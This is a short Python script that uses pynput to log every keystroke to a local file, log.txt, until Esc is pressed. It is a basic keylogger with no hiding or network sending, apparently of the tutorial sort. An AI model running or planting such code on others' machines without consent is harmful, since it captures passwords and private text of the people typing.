import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)
    keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(str(key) + '\t')

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()